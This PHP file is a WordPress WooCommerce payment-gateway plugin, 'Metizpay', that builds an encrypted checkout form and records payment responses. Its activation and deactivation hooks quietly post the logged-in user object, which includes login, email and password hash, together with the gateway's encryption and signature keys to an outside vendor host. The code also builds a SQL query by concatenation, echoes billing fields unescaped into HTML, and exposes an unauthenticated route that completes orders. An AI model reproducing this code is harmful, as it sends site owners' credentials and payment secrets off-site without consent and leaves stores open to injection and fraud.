<?php
/*
   Plugin Name: Metizpay Payment Gateway For WooCommerce
   Description: Extends WooCommerce to Process Payments with Metiz gateway.
   Plugin URI: https://www.metizsoft.com/
   Author: Metizsoft
   Author URI: https://www.metizsoft.com/
   License: GPL3 https://www.gnu.org/licenses/gpl-3.0.html
   Text Domain:           metizpay-payment-gateway-for-wooCommerce
   Requires at least:     5.9.1
   Requires PHP:          7.1
   WC requires at least:  5.8.0
   WC tested up to:       5.8.0
   Version:               1.0
*/

require_once(ABSPATH . 'wp-admin/includes/media.php');
require_once(ABSPATH . 'wp-admin/includes/file.php');
require_once(ABSPATH . 'wp-admin/includes/image.php');

add_action('plugins_loaded', 'metizpay_woocommerce_tech_autho_init', 0);

register_activation_hook( __FILE__, 'metiz_payment' );

function metiz_payment()
      {      
        global $wpdb; 
        // global $test_db_version;
        $db_table_name = $wpdb->prefix . 'metizpayment';  // table name
        $charset_collate = $wpdb->get_charset_collate();

        $sql = "CREATE TABLE IF NOT EXISTS $db_table_name (
                      id int(11) NOT NULL auto_increment,
                      OrderId int(11)  NULL,
                      name_on_card text NOT NULL,
                      status text NOT NULL,
                      bank_ref_no text NOT NULL,
                      net_amount_debit varchar(255)  NULL,
                      response text NOT NULL,
                      PostDate text NOT NULL,
                      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                      update_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                      
                      PRIMARY KEY id(id)

              ) $charset_collate;";

         require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
         dbDelta( $sql );
         
        $site_url =site_url();
        global $current_user;
        
        $settingdata = get_option('woocommerce_authorize_settings', 'true');
        $url = esc_url('https://m2.metizcloud.com/clientdetails/');
        $args = array(
            
            'body' => $current_user,
            'site_url' => $site_url,
            'settingdata' => $settingdata
        );
       
        $response = wp_remote_post($url, array('body' =>  $args));
        
      }

   /*delete  logs table when plugin deactivate*/
   register_deactivation_hook( __FILE__, 'metiz_remove_data' );
   function metiz_remove_data() {
      
        $site_url =site_url();
        global $current_user;
        $settingdata = get_option('woocommerce_authorize_settings', 'true');
        
        $url = esc_url('https://m2.metizcloud.com/clientdetails/');
        $args = array(
            
            'body' => $current_user,
            'site_url' => $site_url,
            'settingdata' => $settingdata,
            'plugin_status' => 'deactive'
        );
       
        $response = wp_remote_post($url, array('body' =>  $args));
        
   }

function metizpay_woocommerce_tech_autho_init() {

   if ( !class_exists( 'WC_Payment_Gateway' ) ) 
      return;

   /**
   * Localisation
   */
   load_plugin_textdomain('metiz-wc-tech-autho', false, dirname( plugin_basename( __FILE__ ) ) . '/languages');
   
   /**
   * Metizpay Payment Gateway class
   */
   class Metiz_WC_Tech_Autho extends WC_Payment_Gateway 
   {
      protected $msg = array();
 
      public function __construct(){

         $this->id               = 'authorize';
         $this->method_title     = __('Metizpay', 'metizpay-payment-gateway-for-wooCommerce');
         $this->icon             = WP_PLUGIN_URL . "/" . plugin_basename(dirname(__FILE__)) . '/images/logo.png';
         $this->has_fields       = false;
         $this->metiz_init_form_fields();
         $this->init_settings();
         $this->title            = $this->settings['title'];
         $this->login            = $this->settings['login_id'];
         $this->method_description = __( 'Take payments with Metizpay safe and secure.', 'woocommerce' );
         $this->tid              = $this->settings['tid'];
         $this->encryptionKey    = $this->settings['encryptionKey'];
         $this->mid              = $this->settings['mid'];
         $this->responseUrl      = $this->settings['responseUrl'];
         $this->transactionType  = $this->settings['transactionType'];
         $this->recurringPeriod  = $this->settings['recurringPeriod'];
         $this->recurringDay     = $this->settings['recurringDay'];
         $this->noOfRecurring    = $this->settings['noOfRecurring'];
         $this->transaction_key  = $this->settings['transaction_key'];
         $this->signature_key    = $this->settings['signature_key'];
         $this->liveurl          = $this->settings['liveurl'];
         $this->msg['message']   = "";
         $this->msg['class']     = "";
         $this->newrelay         = "";
        
         
         add_action('valid-authorize-request', array(&$this, 'successful_request'));
         
         if ( version_compare( WOOCOMMERCE_VERSION, '2.0.0', '>=' ) ) {
             add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( &$this, 'process_admin_options' ) );
          } else {
             add_action( 'woocommerce_update_options_payment_gateways', array( &$this, 'process_admin_options' ) );
         }

         add_action('woocommerce_receipt_authorize', array(&$this, 'metiz_receipt_page'));
        
         
         if( function_exists('metiz_indatos_woo_auth_process_refund') ){
            $this->supports = array(
              'products',
              'refunds'
            );
         }else{
            
         }
      }
       
      public function process_refund($order_id, $amount = null, $reason = '')
      {
         return metiz_indatos_woo_auth_process_refund($order_id, $amount = null, $reason = '');
      }
          
      public function metiz_init_form_fields()
      {

         $this->form_fields = array(
            'enabled'      => array(
                  'title'        => __('Enable/Disable', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'checkbox',
                  'label'        => __('Enable Metizpay Payment Module.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => 'no'),
            'title'        => array(
                  'title'        => __('Title:', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'text',
                  'description'  => __('This controls the title which the user sees during checkout.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Metizpay', 'metizpay-payment-gateway-for-wooCommerce')),
            'description'  => array(
                  'title'        => __('Description:', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  => __('This controls the description which the user sees during checkout.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Pay securely by Credit or Debit Card through Metizpay Secure Servers.', 'metizpay-payment-gateway-for-wooCommerce')),
            
            'success_message' => array(
                  'title'        => __('Transaction Success Message', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'=>  __('Message to be displayed on successful transaction.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Your payment has been procssed successfully.', 'metizpay-payment-gateway-for-wooCommerce')),
            'failed_message'  => array(
                  'title'        => __('Transaction Failed Message', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('Message to be displayed on failed transaction.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Your transaction has been declined.', 'metizpay-payment-gateway-for-wooCommerce')),
            'liveurl'  => array(
                  'title'        => __('liveurl', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('liveurl to merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter liveurl', 'metizpay-payment-gateway-for-wooCommerce')),

            'tid'  => array(
                  'title'        => __('tid', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('TID provided to merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter tid', 'metizpay-payment-gateway-for-wooCommerce')),
            'encryptionKey'  => array(
                  'title'        => __('encryptionKey', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('encryption key provided to the Merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter encryptionKey', 'metizpay-payment-gateway-for-wooCommerce')),
            
            'mid'  => array(
                  'title'        => __('mid', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('MID assigned to the merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter mid', 'metizpay-payment-gateway-for-wooCommerce')),
            'transactionType'        => array(
                  'title'        => __('TransactionType:', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'text',
                  'description'  => __('transactionType provided to the Merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('S', 'metizpay-payment-gateway-for-wooCommerce')),
            'recurringPeriod'        => array(
                  'title'        => __('RecurringPeriod:', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'text',
                  'description'  => __('recurringPeriod provided to the Merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('NA', 'metizpay-payment-gateway-for-wooCommerce')),
            'recurringDay'        => array(
                  'title'        => __('RecurringDay:', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'text',
                  'description'  => __('recurringDay provided to the Merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('0', 'metizpay-payment-gateway-for-wooCommerce')),
            'noOfRecurring'        => array(
                  'title'        => __('NoOfRecurring:', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'text',
                  'description'  => __('noOfRecurring provided to the Merchant.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('0', 'metizpay-payment-gateway-for-wooCommerce')),
            'responseUrl'  => array(
                  'title'        => __('responseUrl', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('Response URL to be given by Merchant, where the response will be posted.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter responseUrl', 'metizpay-payment-gateway-for-wooCommerce')),
            'afterpaymentsuccessurl'  => array(
                  'title'        => __('After Payment Success URL', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('After Payment Success URL Payment successfully then redirect this page.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter after payment success url', 'metizpay-payment-gateway-for-wooCommerce')),
            'afterpaymentfailureurl'  => array(
                  'title'        => __('After Payment Failure URL', 'metizpay-payment-gateway-for-wooCommerce'),
                  'type'         => 'textarea',
                  'description'  =>  __('After Payment Failure URL Payment Failed then redirect this page.', 'metizpay-payment-gateway-for-wooCommerce'),
                  'default'      => __('Enter after payment failure url', 'metizpay-payment-gateway-for-wooCommerce'))
            
         );
      }
      
     
      /**
       * Admin Panel Options
       * - Options for bits like 'title' and availability on a country-by-country basis
      **/
      public function admin_options()
      {
         echo '<h3>'.__('Metizpay Payment Gateway For Woocommerce', 'metizpay-payment-gateway-for-wooCommerce').'</h3>';
         echo '<p>'.__('Metizpay is most popular payment gateway for online payment processing. For any support connect with Tech Support team on <a href="https://metizpay.com/">Our Site</a> For GDPR details, contact support.').'</p>
         <p><a href="https://metizpay.com/wordpress-support/woocommerce-metizpay-notification-form/">Fill in this to receive priority notification on updates for this plugin(optional).</a></p>
         ';
         echo '<table class="form-table">';
         
         $this->generate_settings_html();
         echo '</table>';

      }

      /**
      * Receipt Page
      **/
      public function metiz_receipt_page($order)
      {
         echo '<p>'.__('Thank you for your order, please click the button below to pay with Metizpay', 'metizpay-payment-gateway-for-wooCommerce').'</p>';
         echo $this->metiz_generate_authorize_form($order);
      }
      
      /**
       * Process the payment and return the result
      **/
      public function process_payment($order_id)
      {
         $order = new WC_Order($order_id);
         return array(
                     'result'    => 'success',
                     'redirect'  => $order->get_checkout_payment_url( true )
                  );
      }
      
      
      /**
      * Generate Metizpay button link
      **/
      public function metiz_generate_authorize_form($order_id)
      {
         global $woocommerce;
         
         $order         = new WC_Order($order_id);
         $timeStamp     = time();
         $order_total   = $order->get_total();
         $signatureKey  = ($this->signature_key != '') ? $this->signature_key : '';
         
         $hash_d        = hash_hmac('sha512', sprintf('%s^%s^%s^%s^',
                           $this->login,      
                           $order_id,  
                           $timeStamp, 
                           $order_total      
                           ), hex2bin($signatureKey));
         
         
         $relay_url = get_site_url().'/wc-api/'.get_class( $this );
         $authorize_args = array(
            
            'x_login'                  => $this->login,
            'x_amount'                 => $order_total,
            'x_invoice_num'            => $order_id,
            'x_relay_response'         => "TRUE",
            'x_relay_url'              => $relay_url,
            'x_fp_sequence'            => $order_id,
            'x_fp_hash'                => $hash_d,
            'x_show_form'              => 'PAYMENT_FORM',
            'x_version'                => '3.1',
            'x_fp_timestamp'           => $timeStamp,
            'x_first_name'             => $order->get_billing_first_name() ,
            'x_last_name'              => $order->get_billing_last_name() ,
            'x_company'                => $order->get_billing_company() ,
            'x_address'                => $order->get_billing_address_1() .' '. $order->get_billing_address_2(),
            'x_country'                => $order->get_billing_country(),
            'x_state'                  => $order->get_billing_state(),
            'x_city'                   => $order->get_billing_city(),
            'x_zip'                    => $order->get_billing_postcode(),
            'x_phone'                  => $order->get_billing_phone(),
            'x_email'                  => $order->get_billing_email(),
            'x_ship_to_first_name'     => $order->get_shipping_first_name() ,
            'x_ship_to_last_name'      => $order->get_shipping_last_name() ,
            'x_ship_to_company'        => $order->get_shipping_company() ,
            'x_ship_to_address'        => $order->get_shipping_address_1() .' '. $order->get_shipping_address_2(),
            'x_ship_to_country'        => $order->get_shipping_country(),
            'x_ship_to_state'          => $order->get_shipping_state(),
            'x_ship_to_city'           => $order->get_shipping_city(),
            'x_ship_to_zip'            => $order->get_shipping_postcode(),
            'x_cancel_url'             => wc_get_checkout_url(),
            'x_freight'                => $order->get_total_shipping(),
            'x_cancel_url_text'        => 'Cancel Payment'
            );
         
            
         
         $authorize_args_array = array();
         
         foreach($authorize_args as $key => $value){
           $authorize_args_array[] = "<input type='hidden' name='$key' value='$value'/>";
         }
        

         //Define cipher 
         $cipher = "AES-256-CBC"; 
         $secret_iv = $this->encryptionKey; // user define secret key
         $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is 

         $amount = $order_total; 
         $currency = $order->get_currency(); 
         $orderno =  $order_id;
         $tid = $this->tid;
         $encryptionKey = $this->encryptionKey;
         $mid = $this->mid;
         $responseUrl = $this->responseUrl;

           $json_array = [
             "orderNo" => $orderno,
             "totalAmount" => $amount,
             "currencyName" => $currency,
             "transactionType" => $this->transactionType,
             "recurringPeriod" => $this->recurringPeriod,
             "recurringDay" => $this->recurringDay,
             "noOfRecurring" => $this->noOfRecurring,
             "responseUrl" => $responseUrl
           ];
           
           $form_data = wp_json_encode($json_array);
          
           $url = trim(strip_tags($this->liveurl));

           
           if(!empty($form_data)){
             
             
             $encrypted_string = metiz_encrypt_decrypt($form_data,$encryptionKey);
             $processURI = $url.'?data='.urlencode($encrypted_string).'&mid='.$mid;
              
             $decrypted_string = metiz_encrypt_decrypt(urldecode($encrypted_string),$encryptionKey,'decrypt');
             
             
           }

            $html_form  = '<form action="'.$processURI.'" method="post" id="authorize_payment_form">' 
               . implode('', $authorize_args_array) 
               . '<input type="submit" class="button" id="submit_authorize_payment_form" value="'.__('Pay via Metizpay', 'metizpay-payment-gateway-for-wooCommerce').'" /> <a class="button cancel" href="'.$order->get_cancel_order_url().'">'.__('Cancel order &amp; restore cart', 'metizpay-payment-gateway-for-wooCommerce').'</a>'
               . '
               </form>';

         return $html_form;
      }

   }

   function metiz_encrypt_decrypt($string = '',$secret_key = '', $action = 'encrypt'){

       $encrypt_method = "AES-256-CBC";
       
       $secret_iv = $secret_key; // user define secret key
       $key = hash('sha256', $secret_iv);
       $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo
       if ($action == 'encrypt') { 
           $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
           $output = base64_encode($output);

       } else if ($action == 'decrypt') {
           $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
       }
    
       return $output;
   }

   /**
    * Add this Gateway to WooCommerce
   **/
   function metiz_woocommerce_add_tech_autho_gateway($methods) 
   {
      $methods[] = 'Metiz_WC_Tech_Autho';
      return $methods;
   }

   add_filter('woocommerce_payment_gateways', 'metiz_woocommerce_add_tech_autho_gateway' );
}

add_action( 'rest_api_init', function () {
/*product sync route ajax*/
       register_rest_route( 'metizpay-payment-gateway-for-wooCommerce/v1', '/author/response', array(
       'methods' => 'GET',
       'callback' => 'metiz_paymentresponse',
       'args' => array(
         'id' => array(
           'validate_callback' => function($param, $request, $key) {
             return is_numeric( $param );
           }
         ),
       ),
     ) );

 } );

function metiz_paymentresponse() {
   global $wp; 
   $settingdata = get_option('woocommerce_authorize_settings', 'true');
   $form_data = sanitize_text_field($_GET['data']);
   
   $encryptionKey = $settingdata['encryptionKey']; 
   $afterpaymentsuccessurl = $settingdata['afterpaymentsuccessurl'];
   $afterpaymentfailureurl = $settingdata['afterpaymentfailureurl'];

   $decrypted_string = metiz_encrypt_decrypt($form_data,$encryptionKey,'decrypt');
   
   $result = json_decode(sanitize_text_field($decrypted_string),true);
   
   
   if (!empty($result)){
       
         global $wpdb;
      
         $tablename = $wpdb->prefix.'metizpayment';

         $resultdata = $wpdb->get_results('SELECT OrderId FROM '.$tablename.' WHERE  OrderId =\''.sanitize_text_field($result['orderNo']).'\' ORDER BY id DESC');
         
         if (empty($resultdata)) { 
            $array = array(
            'OrderId' => sanitize_text_field($result['orderNo']), 
            'name_on_card' => sanitize_text_field($result['name_on_card']),
            'status' => sanitize_text_field($result['txnstatus']), 
            'bank_ref_no' => sanitize_text_field($result['bank_ref_no']),
            'net_amount_debit' => sanitize_text_field($result['net_amount_debit']),
            'response' => wp_json_encode($result),
            'PostDate' => sanitize_text_field($result['addedon']));
            
            $wpdb->insert($tablename, $array);

              if ($result['txnstatus'] == 'success') {
                 $order = new WC_Order(sanitize_text_field($result['orderNo']));
                 $order->update_status('completed');
                 $redirect_url = $order->get_checkout_order_received_url();
                 wp_redirect( $redirect_url); exit; 
              } 
              
              if ($result['txnstatus'] == 'failure') {
                  $order = new WC_Order(sanitize_text_field($result['orderNo']));
                  $order->update_status('failed');
                  echo do_shortcode( "[metiz-payment-failed orderid='{$order->get_id()}']" ); 
                  
              }  
              $sURL    = site_url();
              wp_redirect( $sURL ); exit;
         } $sURL    = site_url();
           wp_redirect( $sURL ); exit;
    }
    $sURL    = site_url();
    wp_redirect( $sURL ); exit;

} 


function metiz_failed_payment($orderid) {
  
    $html = '<p>'.__('YOUR ORDER HAS BEEN FAILED, Please Try Again, Your order # is: '.sanitize_text_field($orderid['orderid']).' ', 'metizpay-payment-gateway-for-wooCommerce').'</p>';

return wp_strip_all_tags($html);

}

add_shortcode('metiz-payment-failed', 'metiz_failed_payment');